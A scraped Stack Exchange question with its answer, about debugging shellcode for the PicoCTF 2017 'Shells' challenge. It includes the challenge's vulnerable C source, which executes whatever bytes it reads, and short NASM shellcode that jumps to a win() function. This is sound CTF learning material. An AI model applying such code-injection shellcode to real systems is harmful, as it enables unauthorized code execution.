{
    "title": "Shells CTF segfault - wrong address",
    "link": "https://reverseengineering.stackexchange.com/questions/16837/shells-ctf-segfault-wrong-address",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>PicoCTF 2017 Shells\nI have a binary and source:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/mman.h&gt;\n\n#define AMOUNT_OF_STUFF 10\n\n//TODO: Ask IT why this is here\nvoid win(){\n    system(\"/bin/cat ./flag.txt\");    \n}\n\n\nvoid vuln(){\n    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);\n    if(stuff == MAP_FAILED){\n        printf(\"Failed to get space. Please talk to admin\\n\");\n        exit(0);\n    }\n    printf(\"Give me %d bytes:\\n\", AMOUNT_OF_STUFF);\n    fflush(stdout);\n    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);\n    if(len == 0){\n        printf(\"You didn't give me anything :(\");\n        exit(0);\n    }\n\n    void (*func)() = (void (*)())stuff;\n    func();      \n}\n\nint main(int argc, char*argv[]){\n    printf(\"My mother told me to never accept things from strangers\\n\");\n    printf(\"How bad could running a couple bytes be though?\\n\");\n    fflush(stdout);\n    vuln();\n    return 0;\n}\n</code></pre>\n<p>The goal is to call win() function.</p>\n<p>So: \ngdb ./shells\nI have address of win function: 0x08048540\nthen i create shellcode:</p>\n<pre><code>section .text\n    global _start\n_start:\n    mov eax,0x08048540\n    jmp eax\n\nsection .data\n</code></pre>\n<p>after compile an use sehllcode i have the flag.\nBut when i compile source code instead of using given binary:</p>\n<pre><code>gcc -m32 -fno-stack-protector -z execstack shells.c -o shells2\n</code></pre>\n<p>This not works anymore, segfault all the time.\nWhy with binary file my method works and with compiled source manually not working?\nPS. Flag is in the right place.</p>\n</div>",
    "votes": "-1",
    "answers": 1,
    "views": "722",
    "tags": [
        "disassembly",
        "assembly",
        "binary-analysis",
        "compilers",
        "gcc"
    ],
    "user": "duch4ever",
    "time": "Nov 26, 2017 at 11:41",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<span class=\"comment-copy\">address of <code>win</code> changes after you recompile?</span>",
            "time": null
        },
        {
            "user": "duch4ever",
            "text": "<span class=\"comment-copy\">Yes address changes, after i recompile it is 0x0000065d but if i use this address i have segfault.</span>",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "<span class=\"comment-copy\">well <code>0x0000065d</code> can ba only a part of the address. The full one would be <code>0x804865d</code> I guess</span>",
            "time": null
        },
        {
            "user": "duch4ever",
            "text": "<span class=\"comment-copy\">but why gdb or objdump shows in orignal binary address 0x08048540 but in binary compiled by me 0x0000065d and first works and second not?</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>I think your shellcode is missing the specifier for the bit-ness of the shellcode. You're compiling the <code>shells</code> in 32 bits, but for the <code>nasm</code> (I'm assuming you're using that) doesn't have anything. I'm assuming you're compiling in <code>bin</code> mode and if you check the <a href=\"http://www.nasm.us/doc/nasmdoc6.html\" rel=\"nofollow noreferrer\">documentation</a></p>\n<blockquote>\n<p>...the bin output format defaults to 16-bit mode in anticipation of it being used most frequently to write DOS .COM programs, DOS .SYS device drivers and boot loader software.</p>\n</blockquote>\n<p>So what you need to do is:</p>\n<pre><code>[BITS 32]\nsection .text\n    global _start\n_start:\n    mov eax,0x08048540 ; need to put correct address here of course\n    jmp eax\n\nsection .data\n</code></pre>\n<p>..compile &amp; voilà</p>\n<p><a href=\"https://i.sstatic.net/1RPqH.png\" rel=\"nofollow noreferrer\"><img alt=\"enter image description here\" src=\"https://i.sstatic.net/1RPqH.png\"/></a></p>\n</div>",
            "votes": "2",
            "user": "Paweł Łukasik",
            "time": "Nov 28, 2017 at 22:34",
            "is_accepted": true,
            "comments": []
        }
    ]
}